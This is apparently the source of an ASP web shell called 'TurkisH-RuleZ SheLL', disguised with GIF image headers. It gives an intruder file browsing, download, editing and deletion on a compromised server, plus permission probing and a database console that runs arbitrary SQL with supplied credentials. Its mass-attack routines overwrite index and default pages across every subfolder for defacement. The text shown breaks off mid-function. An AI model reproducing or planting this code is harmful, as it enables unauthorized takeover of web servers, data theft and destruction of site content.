GIF89a;
GIF89a;
GIF89a;
GIF89a;
<%
'if request("rootx") = "b0x" then
'response.cookies("yes") = "1"
'response.cookies("yes").expires = now+352
'end if 
'if not request.cookies("yes") = "1" then
'response.end()
'end if
Server.ScriptTimeOut  = 7200
Fullpath=replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\")
FilePath = mid(Fullpath,InStrRev(Fullpath,"\")+1)
FolderPath = Left(Fullpath,InStrRev(Fullpath,"\"))
const charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
const karakter1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
const karakter2="abcdefghijklmnopqrstuvwxyz"
const karakter3="0123456789"
const karakter4="!@#$%^&*()-_+=~`[]{}|\:;<>,.?/"
mail_array = array("yahoo","hotmail","mynet","gmail","hacker")  '?zel mailler yaratmak için, SPAM dan kaç?rmak için. Securityi a?mak için by b0x
uzanti_array = array("com","net","biz","org","gov","br","info") 
yasak_array = array("b0x","CYBERWARRIOR","CYBERSECURITY","GAL","GAL","TURK")
Dim b0x
Set b0x = CreateObject("Scripting.FileSystemObject") 
Path = Trim(request("Path"))

mode = request("mode")
FolderPath2 = request("FolderPath2")&"\"
islem = request("islem")
del = request("del")
file = request("file")
folder = request("folder")
table  = Request("table")
inject1  = Request("inject1")
inject2  = Request("inject2")
inject3  = Request("inject3")
inject4  = Request("inject4")
inject5  = Request("inject5")
cmdkod  = Request("cmdkod")
hacked = request("hacked")
Path = request("Path")
url = request("url")
count = request("count")
size = request("size")
dbname = request("dbname")
dbkadi = request("dbkadi")
dbsifre = request("dbsifre")
b0xsql = request("b0xsql")
sec = request("sec")
Usermd5 = request("Usermd5")
ara1 = request("ara1")
ara2 = request("ara2")
k1 = request("k1")
k2 = request("k2")
k3 = request("k3")
k4 = request("k4")
waiting = request("waiting")
coding = request("coding")
dizi = request("dizi")
Usersmd5 = request("Usersmd5")
salt = request("salt")
hash2 = request("hash2")
hash3 = request("hash3")
hash4 = request("hash4")
hash5 = request("hash5")
hash6 = request("hash6")
hash7 = request("hash7")
hash8 = request("hash8")
hash9 = request("hash9")
hash10 = request("hash10")

if Path = "" then
Path = FolderPath
else
FolderPath = Path
end if

if mode = "1" then
FolderPath = request.form("remote")
Path = request.form("remote")
end if

nolist = False
popup = False

if mode = "2" or mode = "3" or mode = "7" or mode = "8" or mode = "16" or mode = "17" or mode = "18" or mode = "19" or mode = "20" or mode = "21" or mode = "22" or mode = "24"  or mode = "25" or mode = "26" or mode = "27" or mode = "28" or mode = "29" or mode = "30" or mode = "31" or mode = "32" or mode = "33" or mode = "36" or mode = "38" or mode = "39" or mode = "40" or mode = "41" or mode = "42" or mode = "43" or mode = "44" or mode = "45" or mode = "99" then
popup = True
end if

if mode = "6" then
Response.Buffer=True
Set Fil = b0x.GetFile(file)
Response.contenttype="application/force-download"
Response.AddHeader "Cache-control","private"
Response.AddHeader "Content-Length", Fil.Size
Response.AddHeader "Content-Disposition", "attachment; filename=" & Fil.name
Response.BinaryWrite readBinaryFile(Fil.path)
Set f = Nothing: Set Fil = Nothing
response.end
end if

response.write "<title># TurkisH-RuleZ SheLL </title>"
response.write "<meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-9"">"
response.write "<style>"
response.write "body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}"
response.write ".k1{font-family:Wingdings; font-size:15px;}"
response.write ".k2{font-family:Webdings; font-size:15px;}"
response.write "td{font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;}"
response.write "a{color:#EEEEEE;text-decoration:none;}"
response.write "a:hover{color:#40a0ec;}"
response.write "a:visited{color:#EEEEEE;}"
response.write "a:visited:hover{color:#40a0ec;}"
response.write "input,"
response.write ".kbrtm,"
response.write "select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}"
response.write "textarea{background:#121212;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #121212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}"
response.write "</style>"
%>
<script language=javascript>
    function NewWindow(mypage, myname, w, h, scroll) {
        var winl = (screen.width - w) / 2;
        var wint = (screen.height - h) / 2;
            winprops = 'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable'
        win = window.open(mypage, myname, winprops)
        if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }
    }
    function klasorkopya(yol){
        NewWindow(yol,"",400,130,"no");
    }
    function mass(yol){
        NewWindow(yol,"",555,600,"yes");
    }
    function tester(yol){
        NewWindow(yol,"",600,600,"yes");
    }  
    function klasor(yol){
        NewWindow(yol,"",420,450,"yes");
    }    
    function cmd(yol){
        NewWindow(yol,"",550,555,"no");
    }
    function biz(yol){
        NewWindow(yol,"",550,700,"no");
    }  
    function cmdhelp(yol){
        NewWindow(yol,"",500,230,"no");
    }   
    function somur(yol){
        NewWindow(yol,"",420,220,"yes");
    }       
</script>
<script language="JavaScript">
function openInMainWin(winLocation){
	window.opener.location.href = winLocation
	window.opener.focus();
}
</script>
<%
sub KlasorOku
	on error resume next
    Set f = b0x.GetFolder(FolderPath)
    Set fc = f.SubFolders
    For Each f1 In fc
        Response.Write "<table class=""kbrtm"" ><tr><td><font class=""k1""><a title="" Move And Copy ??  "" href='"&FilePath&"?mode=2&Path="&FolderPath&"\"&f1.Name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Delete File "" href='"&FilePath&"?mode=4&Path="&FolderPath&"&del="&FolderPath&"\"&f1.Name&"&Time="&time&"'>û</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?Path="&FolderPath&"\"&f1.Name&"&Time="&time&"'>"&f1.name&"</a></b></td></tr></table>"   
        Response.Flush
    Next
    call Status 
end sub

sub DosyaOku
	on error resume next
    Set f = b0x.GetFolder(FolderPath)
    Set fc = f.Files
    For Each f1 In fc
        dosyaAdi = f1.name
        num = InStrRev(dosyaAdi,".")
        uzanti = lcase(Right(dosyaAdi,len(dosyaAdi)-num))
        downStr = "<a title=""Delete File"" href='"&FilePath&"?mode=5&Path="&FolderPath&"&del="&FolderPath&"\"&f1.Name&"&Time="&time&"'>û</a><font face=webdings><a title="" Download File "" href='"&FilePath&"?mode=6&file="&f1.path&"&Path="&FolderPath&"&Time="&time&"'>?</a></font><font face=wingdings><a title="" Copy/Move File?? "" href='"&FilePath&"?mode=7&file="&f1.path&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Rename File "" href='"&FilePath&"?mode=16&file="&f1.path&"&islem="&f1.name&"&Path="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
        response.Write "<table class=""kbrtm"" ><tr><td><font size=2>"
        select case uzanti
        case "mdb"
            Response.Write "<a title="" Db in içini G?rmek , SQl sorgu yapmak için T?kla Developed By TurkisH-RuleZ "" href='"&FilePath&"?mode=13&file="&FolderPath&"\"&f1.Name&"&Path="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>M  "&downStr&"</font></td></tr></table>"
        case "asp"
            Response.Write "<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&FolderPath&"\"&f1.Name&"&Path="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a title="" Edit File "" href='"&FilePath&"?mode=10&file="&f1.path&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font></td></tr></table>"
        case "jpg","gif"
            Response.Write "<a title="" Resmi G?rmek için T?kla "" href='"&FilePath&"?mode=12&file="&FolderPath&"\"&f1.Name&"&Path="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=webdings size=4>¢</font><font face=wingdings size=4>  "&downStr&"</font></td></tr></table>"
        case else
            Response.Write "<a title="" ?çini Gomek için T?kla "" href='"&FilePath&"?mode=9&file="&FolderPath&"\"&f1.Name&"&Path="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>2 <a title="" Edit File "" href='"&dosyaPath&"?mode=10&file="&f1.path&"&Time="&time&"&Path="&FolderPath&"'>!</a>"&downStr&"</font></td></tr></table>"
        end select
    Next
    call Status 
end sub

sub Suruculer
	for each drive_ in b0x.Drives
		Response.Write "<tr bgcolor=""#3a3a3a""><td height=""20"" class=""kbrtm"">"
		Response.Write "<a href="" "&FilePath&"?Path="&drive_.DriveLetter&":/ "">"
		if drive_.Drivetype=1 then Response.write "&nbsp;&nbsp;<font class=""k1""><</font>&nbsp;Disk Drive [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detay? ?çin T?kla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
		if drive_.Drivetype=2 then Response.write "&nbsp;&nbsp;<font class=""k1"">;</font>&nbsp;Disk Drive  [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detay? ?çin T?kla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
		if drive_.Drivetype=3 then Response.write "&nbsp;&nbsp;<font class=""k1"">;</font>&nbsp;C?kar?labilir Disk [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detay? ?çin T?kla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
		if drive_.Drivetype=4 then Response.write "&nbsp;&nbsp;<font class=""k2"">³</font>&nbsp;Cd-Rom [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detay? ?çin T?kla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&Path="&Path&"""><font class=""k1"">?</font></a>"
		Response.Write "</a></td></tr>"
	next
		Response.Write "<tr bgcolor=""#3a3a3a""><td class=""kbrtm"" height=""20"">&nbsp;&nbsp;<a href="" "&FilePath&" ""><font class=""k2"">H</font> Local Path </a></td></tr>"
end sub

Sub SurucuInfo
	'Disk Alan?n? G?sterir - Coded Developed By TurkisH-RuleZ
	
	DriveSpace = Request("dspace")
	If Not DriveSpace = "" Then
	on error resume next
	Set driveObject = b0x.GetDrive(DriveSpace)
	D1 = Left((driveObject.FreeSpace/(driveObject.TotalSize*1.0))*100.0, 4)
	if err <> 0 then
	response.write "<center><br> <font color=#FE7A84> <font face=Wingdings size=5>N</font> Disk Haz?r de?il  !!!! :( <font face=Wingdings size=5>N</font></font> <br></center>"
	else
	D2 = Left(((driveObject.TotalSize - driveObject.FreeSpace)/(driveObject.TotalSize*1.0))*100.0, 4)
	D3 = 100
	D1a = 110 - D1
	D2a = 110 - D2
	D3a = 110 - D3
	Response.Write "<br><center><table cellspacing=0 cellpadding=0><tr><td style='background-color: #121212;' colspan=4 align=center class=kbrtm><b>Disk :</b>&nbsp;" & driveObject.DriveLetter & "</td></tr><tr><td class=kbrtm width=60>&nbsp;</td><td class=kbrtm width=100 align=center><b>Bo? Alan</b></td><td class=kbrtm width=100 align=center><b>Kullan?lan Alan</b></td><td class=kbrtm width=100 align=center><b>Toplam Alan</b></td></tr><tr><td height=110 class=kbrtm>&nbsp;</td><td class=kbrtm align=center><table cellpadding=0 cellspacing=0><tr><td colspan=3 height="&D1a&"></td></tr><tr height="&D1&"><td bgcolor=#009900 width=2></td><td bgcolor=#33CC00 width=15></td><td bgcolor=#009900 width=2></td></tr></table></td><td class=kbrtm align=center valign=bottom><table cellpadding=0 cellspacing=0><tr><td colspan=3 height="&D2a&"></td></tr><tr height="&D2&"><td bgcolor=#990000 width=2></td><td bgcolor=#CC0000 width=15></td><td bgcolor=#990000 width=2></td></tr></table></td><td class=kbrtm align=center valign=bottom><table cellpadding=0 cellspacing=0><tr><td colspan=3 height="&D3a&"></td></tr><tr height="&D3&"><td bgcolor=#006699 width=2></td><td bgcolor=#0088CC width=15></td><td bgcolor=#006699 width=2></td></tr></table></td></tr><tr><td class=kbrtm>&nbsp;<b>Yüzde :</b></td><td class=kbrtm align=center>"&D1&" %</td><td class=kbrtm align=center>"&D2&" %</td><td class=kbrtm align=center>"&D3&" %</td></tr><tr><td class=kbrtm>&nbsp;<b>Boyut :</b></td><td class=kbrtm align=center>&nbsp;" & FormatNumber(driveObject.FreeSpace / 1048576) & " MB</td><td class=kbrtm align=center>&nbsp;" & FormatNumber(driveObject.TotalSize / 1048576) - FormatNumber(driveObject.FreeSpace / 1048576) & " MB</td><td class=kbrtm align=center>&nbsp;" & FormatNumber(driveObject.TotalSize / 1048576) & " MB</td></tr></table></center><br><br><br>"
	end if
	Set driveObject = Nothing
	End If
end sub

sub yetkino(str)
response.write "<td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b><font color=#FBE1D7>"&str&" :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;&nbsp;&nbsp;</td>"	
End Sub
sub yetkiyes(str)
response.write "<td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b><font color=#FAFEDE>"&str&" :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;&nbsp;&nbsp;</td>"
end Sub

sub Yetki
	on error resume next
    Set f = b0x.GetFolder(FolderPath)
    if err<>0 then
	yetkino("Reading  ")
	yetkino("Writing ")
	yetkino("Deleting ")
    else
	yetkiyes("Reading  ")

    on error resume next
    Set MyFile = b0x.CreateTextFile(FolderPath & "test.b0x", True)
    MyFile.write "b0x Was Here... =) Writing  - Reading   Testi için"
    set MyFile = Nothing
    if err<>0 then
	yetkino("Writing ")
	yetkino("Deleting ")
    else
	yetkiyes("Writing ")
        on error resume next
        b0x.DeleteFile FolderPath & "test.b0x",true
        if err<>0 then
		yetkino("Deleting ")
        else
		yetkiyes("Deleting ")
        end if
    end if

    end if
    set f = nothing
end sub

Sub olmadi(str)
response.write "<br><center><font color=#FE7A84> <font face=Wingdings size=5>N</font> "&str&" :( <font face=Wingdings size=5>N</font> </font></center>"
End Sub

Sub oldu(str)
response.write "<br><center><font color=#C6FCBE> <font face=Wingdings size=5>N</font> "&str&" ;) Tebrikler ??lem Ba?ar?yla Gerçekle?tirildi.. by b0x <font face=Wingdings size=5>N</font> </font></center>"
End Sub

Sub tablo12(str)
response.write "<tr bgcolor=""#121212""><td align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

Sub tablo30(str)
response.write "<tr bgcolor=""#303030""><td class=""kbrtm"" align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

Sub tablo12L(str)
response.write "<tr bgcolor=""#121212""><td align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

Sub tablo12O(str)
response.write "<tr bgcolor=""#121212""><td class=""kbrtm"" align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

sub Status 
    if err<>0 then
        Response.Write "<center><font color=red size=2>Status  : "&err.Description&"</font></center>"
    end if
end sub

Function ReadBinaryFile(FileName)
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.LoadFromFile FileName
  ReadBinaryFile = BinaryStream.Read
End Function

Sub SQL_menu_by_b0x
	response.write "<center><table width=""450"">"
	response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
	response.write "<form name=""dosyacopypaste"" action='"&FilePath&"' type=""post"">"
	response.write "<table class=""kbrtm"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
	tablo30(" <b>SQL ?njection Merkezi</b>")
	tablo30("&nbsp;")
	tablo12("<font color=#FE7A84> Kullanabilmeniz için SQL kou?tlar? bilmeniz gerek !!! <br> <font face=Wingdings size=5>N</font> Aksi Halde ASP DOsya? Kitlenir. Cevap veremez. Server a Zarar verir.  <font face=Wingdings size=5>N</font></font>")
	tablo12(" Select <input value=""select"" type=""radio"" name=""islem"" checked> <input  size=""60"" type=""text"" name=""inject1"" value='Select * from "&table&"'>")
	tablo12(" Delete <input value=""delete"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject2"" value='Delete from "&table&"'>")
	tablo12(" Insert <input value=""insert"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject3"" value='Insert into "&table&" () values ()'>")
	tablo12(" Update <input value=""update"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject4"" value='Update "&table&" set .. where ..'>")
	tablo12(" Di?er <input value=""diger"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject5"" value='Drop "&table&"'>")
	tablo12("<input name=""mode"" type=""hidden"" value='15' ><input name=""sec"" type=""hidden"" value='"&sec&"' ><input name=""b0xsql"" type=""hidden"" value='"&b0xsql&"' ><input name=""file"" type=""hidden"" value='"&file&"' ><input name=""Path"" type=""hidden"" value='"&FolderPath&"' ><input name=""table"" type=""hidden"" value='"&table&"' ><br><input value="" SQL ?nj. Uygula "" type=""Submit""><br><br>")
	if b0xsql = "" then
		tablo12("<a href='"&FilePath&"?mode=13&file="&file&"&Path="&FolderPath&"&Time="&time&"'> .... ::: Tablolara Geri D?n ::: .... </a><br>")
	else
		tablo12("<a href='"&FilePath&"?mode=34&file="&file&"&Path="&Path&"&b0xsql="&b0xsql&"&islem=1&Time="&time&"'> .... ::: Tablolara Geri D?n ::: .... </a><br>")
	end if
	response.write "</form></table></td></tr></table><br></center>"
	response.write "<table align=""center"" class=""kbrtm""><tr><td align='center'> <a href='"&FilePath&"?mode=36&Path="&Path&"&Time="&time&"' onclick=""klasor(this.href);return false;""><b>...:::::: SQL Komut Yard?m - Kullan?m Klavuzu by b0x ::::::...</b></a> </td></tr></table><br>"
end sub

Sub SQL_by_b0x(sqlPath,sqlkomut) 
	on error resume next
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Provider = "Microsoft.Jet.Oledb.4.0"
	objConn.ConnectionString = sqlPath
	objConn.Open
	if err <> 0 then
	response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Ba?lant?n?z Sa?lanamad? !!! by b0x :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
	else
		on error resume next
		objRcs.Open sqlkomut,objConn, adOpenKeyset , , adCmdText
		if err <> 0 then
		response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> SQL ?njection Komutunuzda Status  var. ( Bilmiyorsan KullanMA :) ) by b0x <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
		else
			Response.Write "<center><table class=""kbrtm"" border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
			for i=0 to objRcs.Fields.count-1
			    Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
			next
			Response.Write "</tr>"
			do while not objRcs.EOF
			   Response.Write "<tr class=""kbrtm"">"
			   for i=0 to objRcs.Fields.count-1
			      Response.Write "<td class=""kbrtm"">"&Replace(objRcs.Fields(i).Value,"<","&lt;")&"&nbsp;</td>"
			   next
			      Response.Write "</tr>"
			      objRcs.MoveNext
			loop
			Response.Write "</table><br></center>"
		end if
	end if
end sub

Sub MSSQL_by_b0x(sqlPath,sqlkomut) 
	on error resume next
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Open sqlPath
	if err <> 0 then
	response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Ba?lant?n?z Sa?lanamad?? !!! by b0x :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
	else
		on error resume next
		objRcs.Open sqlkomut,objConn, adOpenKeyset , , adCmdText
		if err <> 0 then
		response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> SQL ?njection Komutunuzda Status  var. ( Bilmiyorsan KullanMA :) ) by b0x <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
		else
			Response.Write "<center><table class=""kbrtm"" border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
			for i=0 to objRcs.Fields.count-1
			    Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
			next
			Response.Write "</tr>"
			do while not objRcs.EOF
			   Response.Write "<tr class=""kbrtm"">"
			   for i=0 to objRcs.Fields.count-1
			      Response.Write "<td class=""kbrtm"">"&objRcs.Fields(i).Value&"&nbsp;</td>"
			   next
			      Response.Write "</tr>"
			      objRcs.MoveNext
			loop
			Response.Write "</table><br></center>"
		end if
	end if
end sub

sub Tablolama()
on error resume next
if b0xsql = "" then
	if sec = "mssql" then
		b0xsql = "PROVIDER=SQLOLEDB;DATA SOURCE="&file&";UID="&dbkadi&";PWD="&dbsifre&";DATABASE="&dbname&""
	else
		b0xsql = "Driver={MySQL ODBC 3.51 Driver};Server="&file&";Database="&dbname&";Uid="&dbkadi&";Pwd="&dbsifre&""
	end if
end if
Set objConn = Server.CreateObject("ADODB.Connection")
Set objADOX = Server.CreateObject("ADOX.Catalog")
objConn.Open b0xsql
objADOX.ActiveConnection = objConn
if err = 0 then
Response.Write "<center><b><font size=3>Tablolar</font></br><br>"
response.write "<table class=""kbrtm"">"
For Each table in objADOX.Tables
    If table.Type = "TABLE" Then
        Response.Write "<tr><td><font face=wingdings size=5>4</font> <a href='"&FilePath&"?mode=35&b0xsql="&b0xsql&"&table="&table.Name&"&Path="&Path&"&time="&time&"'>"&table.Name&"</a></td></tr>"
    End If
Next
response.write "</table>"
response.write "</center>"
else
Call MSSQL_Form
yazortaa("<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> Server ile ba?lant? Sa?lanamad? !!! girilen De?erler yanl?? .. :( by b0x <font face=Wingdings size=5>N</font> </font><br><br></center>")
end if
end Sub

sub MSSQL_Form()
response.write "<center><table align=""center"" ><tr><td>"
yazorta("<b> MY-MS SQL Server Connection 2.0 by b0x </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><form name=""MssqlbyE_j_d?er"" method='post' action='"&FilePath&"?mode=34&Path="&Path&"&Time="&time&"'><input name='sec' checked value='mssql' type='radio'> <b>MsSQL</b>  &nbsp;&nbsp;  - &nbsp;&nbsp;  <input name='sec' value='mysql' type='radio'> <b>MySQL</b></td></tr><tr><td>Server IP/Hostname  : <input name='file' value='"&file&"' style='color=#C6FCBE' size=35 type='text'></td></tr><tr><td> DB Ad? : <input name='dbname' style='color=#C6FCBE' type='text' value='"&dbname&"' size=44></td></tr><tr><td> KAd? : <input name='dbkadi' style='color=#C6FCBE' value='"&dbkadi&"' type='text' size=46></td></tr><tr><td> ?ifre : <input name='dbsifre' style='color=#C6FCBE' type='text' value='"&dbsifre&"' size=46></td></tr><td align='center'> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: Ba?lan ::..'  type='Submit'></td></tr></form></table>"
yazorta("TUm haklar? Sakl?d?r by b0x =)")
response.write "</td></tr></table></center>"
end sub

sub MassCopier(hedef)
on error resume next
Set cloner = b0x.GetFile(hacked)
cloner.Copy hedef,true
Set cloner = Nothing
end sub

sub MassCreater(yer,savsak)
on error resume next
Set savsakcom = b0x.CreateTextFile(yer, True)
savsakcom.write savsak
Set savsakcom  = Nothing
end sub

sub MassAttack2(yer,ej,svk)
if hash3 = "ok" then
yer = yer&"\"&svk
end if
on error resume next
 if not islem = "ozel" then
 	if hash9 = "copy" then
		MassCopier(yer&"\index.html")
		MassCopier(yer&"\index.htm")
		MassCopier(yer&"\index.asp")
		MassCopier(yer&"\index.cfm")
		MassCopier(yer&"\index.php")
		MassCopier(yer&"\default.html")
		MassCopier(yer&"\default.htm")
		MassCopier(yer&"\default.asp")
		MassCopier(yer&"\default.cfm")
		MassCopier(yer&"\default.php")
	else
		Call MassCreater(yer&"\index.html",ej)
		Call MassCreater(yer&"\index.htm",ej)
		Call MassCreater(yer&"\index.asp",ej)
		Call MassCreater(yer&"\index.cfm",ej)
		Call MassCreater(yer&"\index.php",ej)
		Call MassCreater(yer&"\default.html",ej)
		Call MassCreater(yer&"\default.htm",ej)
		Call MassCreater(yer&"\default.asp",ej)
		Call MassCreater(yer&"\default.cfm",ej)
		Call MassCreater(yer&"\default.php",ej)
	end if
 else
 	if hash9 ="copy" then
		MassCopier(yer&"\"&inject1) 
	else
		Call MassCreater(yer&"\"&inject1,ej)
	end if
 end if
 
a = Replace(FilePath&"?Path="&yer&"&Time="&time,"\","/")
If Err.Number = 0 Then
	response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&yer&" </a><font color=#C6FCBE> OK !! <font class=""k1"">ü</font></td></tr></table>"
else
	response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&yer&" </a><font color=#FE7A84> Noo :( !! <font class=""k1"">û</font></td></tr></table>"
end if
Err.Number = 0
Response.Flush
end sub

sub MassAttack(yer,ej,svk)
dim fastb0x
on error resume next
Set f = b0x.GetFolder(yer)
Set fc = f.SubFolders
For Each f1 In fc

if hash3 = "ok" then
fastb0x = f1.path&"\"&svk
else
fastb0x = f1.path
end if

 if not islem = "ozel" then
 	if hash9 = "copy" then
		MassCopier(fastb0x&"\index.html")	
		MassCopier(fastb0x&"\index.htm")
		MassCopier(fastb0x&"\index.asp")
		MassCopier(fastb0x&"\index.cfm")
		MassCopier(fastb0x&"\index.php")
		MassCopier(fastb0x&"\default.html")
		MassCopier(fastb0x&"\default.htm")
		MassCopier(fastb0x&"\default.asp")
		MassCopier(fastb0x&"\default.cfm")
		MassCopier(fastb0x&"\default.php")
	else
		Call MassCreater(fastb0x&"\index.html",ej)	
		Call MassCreater(fastb0x&"\index.htm",ej)
		Call MassCreater(fastb0x&"\index.asp",ej)
		Call MassCreater(fastb0x&"\index.cfm",ej)
		Call MassCreater(fastb0x&"\index.php",ej)
		Call MassCreater(fastb0x&"\default.html",ej)
		Call MassCreater(fastb0x&"\default.htm",ej)
		Call MassCreater(fastb0x&"\default.asp",ej)
		Call MassCreater(fastb0x&"\default.cfm",ej)
		Call MassCreater(fastb0x&"\default.php",ej)
	end if
 else
 	if hash9 = "copy" then
		MassCopier(fastb0x&"\"&inject1) 
	else
		Call MassCreater(fastb0x&"\"&inject1,ej) 	
	end if
 end if

	a = Replace(FilePath&"?Path="&fastb0x&"&Time="&time,"\","/")
	If Err.Number = 0 Then
		response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&fastb0x&" </a><font color=#C6FCBE> OK !! <font class=""k1"">ü</font></td></tr></table>"
	else
		response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&fastb0x&" </a><font color=#FE7A84> Noo :( !! <font class=""k1"">û</font></td></tr></table>"
	end if
	Err.Number = 0
	Response.Flush
	
	if islem = "brute" then
		Call MassAttack(f1.path&"\",ej,svk)
	end if
Next
end sub

Sub tester(yer)
	on error resume next
	Set f = b0x.GetFolder(yer)
	Set fc = f.SubFolders
	For Each f1 In fc
	
	a = Replace(FilePath&"?Path="&f1.path&"&Time="&time,"\","/")
	response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&f1.path&" </a> "
	Response.Flush
	
	Err.Number = 0
	on error resume next
	Set f = b0x.GetFolder(f1.path)
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Reading :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Reading :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	set f = nothing
	Err.Number = 0
	Response.Flush
	
	on error resume next
	Set MyFile = b0x.CreateTextFile(f1.path & "test.b0x", True)
	MyFile.write " b0x Was Here "
	set MyFile = Nothing
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Writing :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Writing :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	set f = nothing
	Err.Number = 0
	Response.Flush
	
	on error resume next
	b0x.DeleteFile f1.path & "test.b0x",true
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Deleting :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
